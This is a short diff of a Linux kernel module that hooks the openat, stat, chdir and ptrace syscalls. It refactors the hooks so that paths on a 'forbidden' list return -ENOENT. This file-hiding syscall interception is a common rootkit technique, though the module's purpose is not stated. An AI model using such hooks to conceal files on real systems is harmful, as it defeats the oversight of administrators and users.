@@ -1,7 +1,5 @@
 #include "forbid.h"
-
-LIST_HEAD(forbidden_files_list);
-spinlock_t forbidden_files_lock = __SPIN_LOCK_UNLOCKED(forbidden_files_lock);
+#include "forbid_api.h"
 
 asmlinkage long (*__orig_openat)(const struct pt_regs *)        = NULL;
 asmlinkage long (*__orig_newfstatat)(const struct pt_regs *)    = NULL;
@@ -14,14 +12,15 @@ asmlinkage long (*__orig_ptrace)(const struct pt_regs *regs)    = NULL;
 
 asmlinkage long notrace openat_hook(const struct pt_regs *regs) {
     const char __user *u_path = (const char __user *)regs->si;
-    if (path_is_forbidden(u_path))
+    if (forbid_contains(u_path))
         return -ENOENT;
+    
     return __orig_openat(regs);
 }
 
 asmlinkage long notrace stat_hook(const struct pt_regs *regs) {
     const char __user *u_path = (const char __user *)regs->si;
-    if (path_is_forbidden(u_path))
+    if (forbid_contains(u_path))
         return -ENOENT;
 
     switch ((int)regs->orig_ax) {
@@ -41,7 +40,7 @@ asmlinkage long notrace stat_hook(const struct pt_regs *regs) {
 asmlinkage long notrace chdir_hook(const struct pt_regs *regs)
 {
     const char __user *u_path = (const char __user *)regs->di;
-    if (path_is_forbidden(u_path))
+    if (forbid_contains(u_path))
         return -ENOENT;
     return __orig_chdir(regs);
 }
